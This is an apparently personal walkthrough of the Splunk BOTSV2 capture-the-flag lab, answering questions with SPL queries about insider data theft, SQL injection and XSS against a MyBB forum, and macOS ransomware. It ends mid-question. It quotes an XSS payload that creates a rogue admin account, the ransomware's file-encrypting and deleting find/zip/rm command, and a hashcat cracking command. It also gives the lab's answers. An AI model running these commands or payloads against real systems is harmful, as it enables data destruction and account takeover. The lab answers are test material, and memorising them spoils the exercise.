# **Walkthrough**

## **Series 1xx**


### **Q100**

Amber Turing was hoping for Frothly (her beer company) to be acquired by a potential competitor which fell through, but visited their website to find contact information for their executive team. What is the website domain that she visited? Answer example: google.com 


#### **Approach**

The IP Addresses for Amber Turing and the visited website were needed to be known. 

The first point must be Amber Turing as she was the visitor. 

```
index=botsv2 "amber" sourcetype="pan:traffic" (80 OR 443)
```
![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/1.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/2.png)


Amber's private and public IPs were 10.0.2.101 and 71.39.18.125 found in Palo Alto Traffic Logs.

The private IP was used in web logs to find the destination website visited as private IPs can show the specific route to the destination through NAT using public IP. 

I used the "beer" keyword in the search to find the beer site thinking there could be websites named beer.


```
index=botsv2 sourcetype="stream:http" src_ip="10.0.2.101" dest_port=80
| regex site="beer"
| stats count by site
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/3.png)


**Answer: `www.berkbeer.com`**

### **Q101**

Amber found the executive contact information and sent him an email. What is the CEO's name? Provide the first and last name.


#### **Approach**

I could use the 'berkbeer' domain name and found the work email for Amber Turing in the smtp logs. 

I made the time sorting to start from the lowest value in order to see the first email sent to the CEO.

```
index=botsv2 sourcetype="stream:smtp" "aturing@froth.ly" "berkbeer"
| sort +_time
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/4.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/5.png)


Found the CEO's email as  `mberk@berkbeer.com` and the name was found in the reply from that email.

**Answer: Martin Berk**


### **Q102**

After the initial contact with the CEO, Amber contacted another employee at this competitor. What is that employee's email address?


#### **Approach**


In the email replied from `mberk@berkbeer.com`, Bernhard was mentioned. 

I found his email as `hbernhard@berkbeer.com` in the following logs from the previous query and the content sent from Amber was encoded in base64. 

It could be that Amber encoded her content in base64 for the malicious reasons.


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/6.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/7.png)


**Answer: `hbernhard@berkbeer.com`**


### **Q103**

What is the name of the file attachment that Amber sent to a contact at the competitor? 


#### **Approach**

Investigating in the smtp log that Amber sent to `hbernhard@berkbeer.com`.


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/8.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/8_1.png)


**Answer: Saccharomyces_cerevisiae_patent.docx**


### **Q104**

What is Amber's personal email address?


#### **Approach**


That was a little tricky. I tried to find that in the smtp logs and found nothing but as mentioned in the Q102, the content were encoded in base64 in the email sent from Amber to `hbernhard@berkbeer.com`. 

After decoding this in cyberchef, the private message was found and there was Amber's personal email.


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/9.png)


**Answer: `ambersthebest@yeastiebeastie.com`**


### **Q105**

What version of TOR did Amber install to obfuscate her web browsing? 

#### **Approach**


I would need to find the installed TOR browser in Amber's machine. The information must be in Windows Sysmon logs and she had to certainly download the file before the installation. 


```
index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational" "amber" "tor"
|stats count by Image EventCode
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/10.png)
The file was 'C:\Users\amber.turing\Downloads\torbrowser-install-7.0.4_en-US.exe'


**Answer: 7.0.4**
 


## **Series 2xx**


### **Q200**

What is the public IPv4 address of the server running `www.brewertalk.com`?


#### **Approach**

It's a web server and because of this, the information was easily found in http web logs.

```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80
| stats count by dest_ip
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/11.png)


There were both private and public IPs for that but I excluded '172.31.4.249' as it's a private one.

**Answer: 52.42.208.228**


### **Q201**

Provide the IP address of the system used to run a web vulnerability scan against `www.brewertalk.com`.


#### **Approach**


A web vulnerability scan would make lots of automated requests. I aimed for the IP that made the most requests and after seeing its logs to see the content, the attack attempts were found.


```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80
| stats count by src_ip
| sort -count
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/12.png)


**Answer: 45.77.65.211**


### **Q202**

The IP address from question 201 is also being used by a likely different piece of software to attack a URI path. What is the URI path? Answer guidance: Include the leading forward slash in your answer. Do not include the query string or other parts of the URI. Answer example: `/phpinfo.php`


#### **Approach**


Firstly, I needed to investigate user agents to know which software the attacker used for finding out the attack flow as mapping the http methods used and the target uri to them.

```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80   src_ip="45.77.65.211"
|stats count by http_user_agent
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/13.png)


One got `w3af.org` in the user agent. w3af is an open-source web application security scanner and the attacker forgot to sanitize the domain in its crafted user agent. From this, I knew which tool they used. 

```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80   src_ip="45.77.65.211"  http_user_agent="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; w3af.org)"  
| stats  count by uri_path
| sort -count
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/14.png)


```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80   src_ip="45.77.65.211"  http_user_agent="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; w3af.org)" uri_path="/member.php" | stats  count by http_method
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/15.png)


/member.php had the most requests with the http POST method.

I searched with another useragent to see more information.

```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80   src_ip="45.77.65.211"  http_user_agent="Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36" http_method=POST
| stats count by  uri_path
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/16.png)


/member.php had only the http POST requests from them using this user agent.

After analyzing the logs, I found the sql injection attempts and the targeted uri_path was `/member.php` requested with the http POST method. 

```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80   src_ip="45.77.65.211"  http_user_agent="Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36" http_method=POST uri_path="/member.php"
| stats count by  form_data
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/17.png)



**Answer: `/member.php`**


### **Q203**

What SQL function is being abused on the uri path from question 202?


#### **Approach**

The field 'form_data' had the sql injection attempts as they were under in http requests and it could be seen in Q202. I analyzed this again to see the function used.

```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80 src_ip="45.77.65.211" "uri_path"="/member.php" "sql"
| stats count by form_data
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/18.png)


It was found that updatexml function was being abused. 

`Note: updatexml is abused by sqli tools to see the error-based data extraction. 
MySQL throws a verbose error if the XPath expression is invalid.
SQLI tools put the arbitrary values to xpath_expression argument to see the error which contains the results.
The function syntax is updatexml(xml_target, xpath_expr, new_value).`


**Answer: updatexml**


### **Q204**

What is Frank Ester's password salt value on `www.brewertalk.com`? 


#### **Approach**


`Note: salt values are added to the passwords before the whole hashes are computed in order to make the precomputed attacks like 'rainbow table' fail. `


In a database, there will be every computed hash and its salt value. The question asked that. 


From Q202, I used the two user agents. I explicitly used this one, "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36", as it was related to the SQLI attacks. 


I tried to search the http response for the attack to frank ester's account first for seeing his related information.


```
index=botsv2 dest_port=80 src_ip="45.77.65.211"  sourcetype="stream:http" site="www.brewertalk.com"  "frank" "uri_path"="/member.php"
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/19.png)


The name 'frank' could be seen in the MyBB error and the 'ORDER BY UID LIMIT 0,1' was the first row from the database table sorted by the 'UID' column.


The attacker would have seen the salt value in the http response when they attacked with sqli methods. Seeing the logs from the oldest to the newest using the 'reverse' function...


```
index=botsv2 sourcetype="stream:http" site="www.brewertalk.com" dest_port=80 src_ip="45.77.65.211" "uri_path"="/member.php" "salt"  http_user_agent="Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36"
| reverse
| table dest_content
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/20.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/21.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/22.png)


Saw the length of the salt first and its value subsequently related to the frank's row, 'ORDER BY UID LIMIT 0,1'.

`Note: In these attacks, attackers check the length first to see the actual length before dumping the value as XPATH error value from updatexml gets truncated at 32 characters.`


**Answer: gGsxysZL**


### **Q205**

What is user btun's password on `brewertalk.com`?


#### **Approach**

`Note: salt values are added to the passwords before the whole hashes are computed in order to make the precomputed attacks like 'rainbow table' fail. `

In a database, there will be every computed hash and the salt value.

MyBB's format is md5(md5($salt)+md5($pass)). I would need btun's salt and the whole computed hash stored in MyBB.

let's find btun's row and salt first.

```
index=botsv2 dest_port=80 src_ip="45.77.65.211"  sourcetype="stream:http" site="www.brewertalk.com"  "btun" "uri_path"="/member.php"
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/23.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/24.png)


Got the row of btun as 'ORDER BY UID LIMIT 2,1'. Salt value was still needed.

```
index=botsv2 dest_port=80 src_ip="45.77.65.211" "uri_path"="/member.php" "salt" sourcetype="stream:http" site="www.brewertalk.com"   http_user_agent="Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.17 Safari/537.36" "ORDER BY UID LIMIT 2,1"
| reverse
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/25.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/26.png)

Got the salt value as 'tlX7CQPE'. I could now find the whole computed hash of the password using the row and the salt.

Using reverse to get the events from the oldest to the newest to find the password hash.

```
index=botsv2 dest_port=80 src_ip="45.77.65.211" sourcetype="stream:http" site="www.brewertalk.com" "/member.php"  "SELECT password FROM mybb_users ORDER BY UID LIMIT 2,1"
| reverse
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/27.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/28.png)

Attacker got the character count as 32.

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/29.png)

The length of password was 32 but the subtracted string was only 31 character long. 


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/30.png)


The final character was extracted.

So, the total password hash value was 'f91904c1dd2723d5911eeba409cc0d14' and it's a md5 hash as it is exactly 32 characters long.

Running the hashcat command in my Linux VM to crack the md5hash of MyBB `hashcat -m 2811 -a 0 'f91904c1dd2723d5911eeba409cc0d14':'tlX7cQPE' ~/rockyou/rockyou.txt` ...

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/31.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/32.png)


Got the password for btun as '123456'.


**Answer: 123456**


### **Q206**

What are the characters displayed by the XSS probe? Answer guidance: Submit answer in the native language or character set.


#### **Approach**

Basic xss probes mostly contain <script>alert("x")</script> tags and thus, I tried to find with that keyword first.


```
index=botsv2 sourcetype="stream:http"   "<script>alert(*"
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/33.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/34.png)


**Answer: 대동**


### **Q207**

What was the value of the cookie that Kevin's browser transmitted to the malicious URL as part of a XSS attack? Answer guidance: All digits. Not the cookie name or symbols like an equal sign.


#### **Approach**

Firstly, I needed to aim for the XSS payload that got the cookie.

```
index=botsv2  sourcetype="stream:http" kevin "<script>"
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/35.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/36.png)

Malicious xss payload script put by the attacker.

```var postdata= "my_post_key="+my_post_key+"&username=kIagerfield&password=beer_lulz&confirm_password=beer_lulz&email=kIagerfield@froth.ly&usergroup=4&additionalgroups[]=4&displaygroup=4"```

The adversary injected the payload at the 'utid' parameter as the stored xss mechanism stealing the token, 'my_post_key' of the admin, Kevin, and created another user account 'kIagerfield' and the password 'beer_lulz' with the email `kIagerfield@froth.ly` using that key and the admin privileges (usergroup=4) in MyBB under Kevin's session.



![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/37.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/38.png)

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/39.png)


```
<div id="logo"><h1><span class="invisible">MyBB Admin CP</span></h1></div>
<div id="welcome"><span class="logged_in_as">Logged in as <a href="index.php?module=user-users&amp;action=edit&amp;uid=17" class="username">kevin</a></span> | <a href="http://www.brewertalk.com" target="_blank" class="forum">View Forum</a> | <a href="index.php?action=logout&amp;my_post_key=1bc3eab741900ab25c98eee86bf20feb" class="logout">Log Out</a></div>
<div id="menu">
```

HTML Code from these three screenshots showing kevin was an admin for MyBB and his post key as '1bc3eab741900ab25c98eee86bf20feb'.

```
index=botsv2 sourcetype="stream:http" "kevin"    src_ip="10.0.2.109" dest_ip="52.42.208.228"
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/40.png)


As the question mentioned the cookie had only digits and thus, lastvisit would make more sense.


The cookie was sent to the attacker's server. Attacker got the admin session cookie and Kevin's username and password.


**Answer: 1502408189**


### **Q208**

The `brewertalk.com` web site employed Cross Site Request Forgery (CSRF) techniques. What was the value of the anti-CSRF token that was stolen from Kevin Lagerfield's computer and used to help create an unauthorized admin user on `brewertalk.com`?


#### **Approach**


`Note: Anti-CSRF tokens are usually hidden form elements set. If a form is submitted without the anti-CSRF token, the backend code of the website rejects the transaction to prevent malicious sources from attackers and they are temporary, random values linked to a user's current session `


Attacker's script had stolen my_post_key in its script and uploaded to `brewertalk.com` to create a new user with the admin privilege under Kevin's session.

That was the anti-CSRF token of Kevin. 


Actually, attacker injected their XSS payload script to use the value in my_post_key that was the temporary anti-CSRF token as a user session for Kevin to create another admin level account controlled by them.


As the token would be hidden, I searched with 'hidden' in the raw log to confirm my theory. 


```
index=botsv2  sourcetype="stream:http" kevin "<script>"
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/41.png)

I had got that anti-CSRF token from Q207.

**Answer: 1bc3eab741900ab25c98eee86bf20feb**


### **Q209**

What `brewertalk.com` username was maliciously created by a spearphishing attack?


#### **Approach**


In Q207, it was seen that the username `kIagerfield` was created.


**Answer: kIagerfield**


## **Series 3xx**


### **Q300**

According to Frothly's records, what is the likely MAC address of Mallory's corporate MacBook? Answer guidance: Her corporate MacBook has the hostname MACLORY-AIR13. 

I skipped this as there was no Splunk Enterprise Security for me in the lab I did to use 'Asset Centre'.


### **Q301**

What episode of Game of Thrones is Mallory excited to watch? Answer guidance: Submit the HBO title of the episode.


#### **Approach**


The abbreviation for Game of Thrones is 'GOT'. I got the hostname from Q300. Tried keyword guessing.

```
index=botsv2 host="MACLORY-AIR13" "GOT"
| stats count by columns.target_path
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/42.png)

Got the episode number and season as GoT.S07E02. 

After searching on google, its HBQ title is...

**Answer: Stormborn**


### **Q302**

BOTS2 302: What is Mallory Krauesen's phone number? Answer guidance: ddd-ddd-dddd where d=[0-9]. No country code.


This requires the asset center and the dashboard.


### **Q303**

Enterprise Security contains a threat list notable event for MACLORY-AIR13 and suspect IP address 5.39.93.112. What is the name of the threatlist (i.e. Threat Group) that is triggering the notable?


This requires the asset center and the dashboard.


### **Q304**


Considering the threatlist you found in the question above, and related data, what protocol often used for file transfer is actually responsible for the generated traffic? 


#### **Approach**


Using the IP Address from Q303...


```
index=botsv2 "5.39.93.112"
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/43.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/44.png)


10.0.4.4 was connecting to 5.39.93.112. 71.39.18.125 was the src_NAT_public IP for the organization and the protocol used was bittorrent.


 "mkraeusen" and "10.0.4.4" were the src_user and the src_ip.


 **Answer: bittorrent**



### **Q305**

Mallory's critical PowerPoint presentation on her MacBook gets encrypted by ransomware on August 18. At what hour, minute, and second does this actually happen? Answer guidance: Provide the time in PDT. Use the 24h format `HH:MM:SS`, using leading zeroes if needed. Do not use Splunk's _time (index time).


#### **Approach**

Using reverse command to get the oldest events first for seeing the first time the encryption happened at.

```
index=botsv2 "*.pptx" host="MACLORY-AIR13"
|reverse
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/45.png)


The second event had the ctime, 1503093022, that stands for the status change time and the target_path had the file with the extension .crypt meaning the file was changed to the encrypted state at that time.

 
 Frothly_marketing_campaign_Q317.pptx.crypt was the file.


This is an unix epoch format. Convert this at `https://www.epochconverter.com/`. 

UTC = `21:50:22`. PDT = `14:50:22`


**Answer: `14:50:22`**


### **Q306**

How many seconds elapsed between the time the ransomware executable was written to disk on MACLORY-AIR13 and the first local file encryption? Answer guidance: Use the index times (_time) instead of other timestamps in the events.


#### **Approach**


Needed to know the two events, the first local file encryption and the ransomware executable written to disk on MACLORY-AIR13.


Using reverse to see the oldest events first.

```
index=botsv2 host="MACLORY-AIR13"  "*.crypt" 
| reverse
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/46.png)


The encryption Unix command, `find /Users/ -not -iname "README!.txt" -print -exec zip -0 -P TPq3NrjTLn2fSBZIxklL6ZRM5 {}.crypt {} \; -exec rm {} \; -exec touch -mt 201002130000 {}.crypt \;
`, was run at 08/18/17 `21:50:43` UTC.


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/47.png)


At the same time, the first file encrypted was  "/Users/mallorykraeusen/Desktop/.DS_Store.crypt".

I needed to find the time the ransomware executable was written at.


Going back to the timeframe within 5 mins before that event happened to find the app written as the encrypted command from it was run at the same time as the first file encrypted.


Mac executable file extension is '*.app'.

```
index=botsv2 host="MACLORY-AIR13" "*.app" action="added" 
| reverse
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/48.png)


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/49.png)


Found the malicious file with suspicious name under User Downloads folder. 

/Users/mallorykraeusen/Downloads/Office 2016 Patcher.app at Fri Aug 18 `21:48:31` 2017 UTC.

There is no patcher app from Office and the directory being Downloads meant the victim machine got that ransomware executable in that folder at that time.

Subtracting the time gave the 132 seconds (2:12 mins).

**Answer:  132**


### **Q307**

Kevin Lagerfield used a USB drive to move malware onto kutekitten, Mallory's personal MacBook. She ran the malware, which obfuscates itself during execution. Provide the vendor name of the USB drive Kevin likely used. Answer Guidance: Use time correlation to identify the USB drive. 


#### **Approach**


I needed to use time correlation to the two events, USB drive inserted, and the malware run. 

Investigated the malware running event to know the USB insertion timeline and then pivoted to that for getting the USB information.

`Note: The related sourcetype was about 'osquery', a tool that lets a user query their Operating Systems like a database in SQL. It has built-in packs, JSON config files containing a collection of pre-written queries grouped.`


`Note: In SPL, '/', forward slash, works as a delimiter in SPL and the string parser of Splunk will split on those forward slashes during indexing, making keyword search only instead of 'directory path' search. 
To make this work, an escaped character, '\', backslash, must be put in front of it to make those as a literal character but as there is no direct escaping for '\/' letting the string parser omit the backslash (not consuming the following character, the forward slash) and treat the forward slash as a delimiter again, the double backslashes were needed to put making '\\' as a '\' literal and SPL treats '\/' as a literal '/'.`


`Summary: \\/  →  Layer 1 (string parser) produces \  →  Layer 2 (search interpreter) sees \/ `


```index=botsv2 "kutekitten"  "\\/Users\\/mkraeusen\\/*" | stats  count by columns.target_path```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/50.png)


I found the suspicious file under Downloads directory.


```
index=botsv2 "kutekitten"   "columns.target_path"="/Users/mkraeusen/Downloads/Important_HR_INFO_for_mkraeusen"
| reverse
```



![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/51.png)

Got the file hash and the time of the file created and ran as Aug 03 `18:19:07` UTC.



![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/52.png)


Virustotal flagged this as a malware that used perl language.


Searched the usb drive insertion event and its timeline before the malware file was created and run.

```
index=botsv2 "kutekitten"  "usb" name="pack_hardware-monitoring_usb_devices"
| reverse
| table _time action columns.vendor_id
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/53.png)


Found the suspicious USB drive event with the action added at Aug 03 `18:18:10` 2017 UTC and since it was the time the closet to that of the malware file being created and run, that usb drive event was the answer. 


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/54.png)

Vendor ID, 058f, is the one from Alcor Micro Corp.

**Answer: Alcor**



### **Q308**

What programming language is at least part of the malware from the question above written in?


#### **Approach**


We had already seen in Q307. It's perl.

Besides, we could find in the logs. As the malware was running in the process, the OS process logs could be investigated.

```
index=botsv2 "kutekitten" name="pack_osx-proclaunch_ProcessesInUserSpace" "columns.name"="perl5.18"
```



![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/55.png)


There was no perl script file run shown in the cmdline and the process was shown as java in it even though the actual binary path run was /usr/bin/per15.18. That's the malware running with perl and masquerading as a legitimate JVM spawn.

The technique is a process-masquerade.


**Answer: Perl**



### **Q309**

The malware from the two questions above appears as a specific process name in the process table when it is running. What is it?

Got the answer from Q308.

Answer: Java


Q310: The malware infecting kutekitten uses dynamic DNS destinations to communicate with two C&C servers shortly after installation. What is the fully-qualified domain name (FQDN) of the first (alphabetically) of these destinations?


#### **Approach**

There were dynamic DNS domains shown in VirusTotal under Relations tab.


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/56.png)

Chose the first (alphabetically) of these destinations as per question.

**Answer: eidk.duckdns.org** 


### **Q311**

From the question above, what is the fully-qualified domain name (FQDN) of the second (alphabetically) contacted C&C server?


**Answer: eidk.hopto.org**



### **Q312** 

What is the average Alexa 1M rank of the domains between August 18 and August 19 that MACLORY-AIR13 tries to resolve while connected via VPN to the corporate network? Answer guidance: Round to two decimal places. Remember to include domains with no rank in your average! Answer example: 3.23 or 223234.91 


Let me skip this as there's no csv file relate to this in my lab. 


### **Q313**

Two .jpg-formatted photos of Mallory exist in Kevin Lagerfield's server home directory that have eight-character file names, not counting the .jpg extension. Both photos were encrypted by the ransomware. One of the photos can be downloaded at the following link, replacing 8CHARACTERS with the eight characters from the file name. `https://splunk.box.com/v/8CHARACTERS` After you download the file to your computer, decrypt the file using the encryption key used by the ransomware. What is the complete line of text in the photo, including any punctuation? Answer guidance: The encryption key can be found in Splunk.


#### **Approach**


The Microsoft sysmon logs related to Kevin's server machine would have those jpg files. I needed those two files first and the password used to decrypt those files. 


```
index=botsv2 sourcetype="xmlwineventlog:microsoft-windows-sysmon/operational"  "kevin" "*.jpg.crypt"
| stats count by file_path
```



![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/57.png)


Found the jpg files with 8 character long under his home directory. 


From Q306, the Unix command run by the ransomware, `find /Users/ -not -iname "README!.txt" -print -exec zip -0 -P TPq3NrjTLn2fSBZIxklL6ZRM5 {}.crypt {} \; -exec rm {} \; -exec touch -mt 201002130000 {}.crypt \;` had the password as "TPq3NrjTLn2fSBZIxklL6ZRM5".


The ransomeware encrypted the files using that password. 

That's the password to do decryption to the file but the file has been removed on that share as the lab is old. Let me skip this though I got the correct solution to get the answer. 


## **Series 4xx**


### **Q400**

A Federal law enforcement agency reports that Taedonggang often spearphishes its victims with zip files that have to be opened with a password. What is the name of the attachment sent to Frothly by a malicious Taedonggang actor?


#### **Approach**

The zip files would definitely be in smtp logs as described per the question.


```
index=botsv2  "*.zip" sourcetype="stream:smtp"
```


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/58.png)

Found the zip file and investigated its email content.

```
index=botsv2  "*.zip" sourcetype="stream:smtp" "attach_filename{}"="invoice.zip"
|reverse
```



![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/59.png)



![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/60.png)


The originating sending server was not compatible with the domain in the 'From' field. This was a phishing email and the zip file had a password (912345678) to open it. 


**Answer:  invoice.zip**


### **Q401**

The Taedonggang APT group encrypts most of their traffic with SSL. What is the "SSL Issuer" that they use for the majority of their traffic? Answer guidance: Copy the field exactly, including spaces. 


#### **Approach**


SSL works in TCP/IP Layer. I would need the attacker's IP and the information in the 'stream:tcp' to know the issuer used in the connection to the brewertalk domain. 

IP information had not been found yet.

As the file name was already known, I tried to investigate the content further from Q400 as it was coded in base64 format to get any more information related to IP and the domain.


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/61.png)

Copied all of the base64 content and saved it in a file. 


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/62.png)


stripped newlines

`cat invoice | tr -d '\n' > invoice1`

I saw whitespace left in the file when I checked with cat command.


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/63.png)


stripped any whitespace again to get the whole base64 content.

`cat invoice1 | tr -d ' ' > invoice2`


![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/64.png)


All was clear.


`cat invoice2 | base64 --decode > invoice.zip`

`unzip invoice.zip`
![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/65.png)


Used the password (912345678) in the email. (Don't run the file as it's a malware. Use strings 'file' to see its string contents.)


`sha256sum invoice.doc` to get the hash for uploading and seeing it on VirusTotal.

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/66.png)


Got its sha256 hash. 
![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/67.png)


After uploading the hash on VirusTotal, the IP, `45.77.65.211`, seen in the above series, was contained in the contacted IP addresses section. 


Using that IP information, I could search SSL information in the stream:tcp logs.


```
index=botsv2  sourcetype="stream:tcp" "45.77.65.211" "ssl" 
| stats count by ssl_issuer
```

![](https://github.com/mintheinkhinemtk/Splunk_BOTS_Labs/blob/main/Splunk_BOTSV2/screenshots/68.png)


**Answer: C=US**



### **Q402**

Threat indicators for a specific file triggered notable events on two distinct workstations. What IP address did both workstations have a connection with?


Let me skip this as I didn't have any incident dashboard.



### **Q403**  

Based on the IP address found in question 402, what domain of interest is associated with that IP address?


#### **Approach**

The IP form Q402 is `160.153.91.7` when it was searched on google.

As I got the IP Address, I could investigate the answer in dns logs. 

```
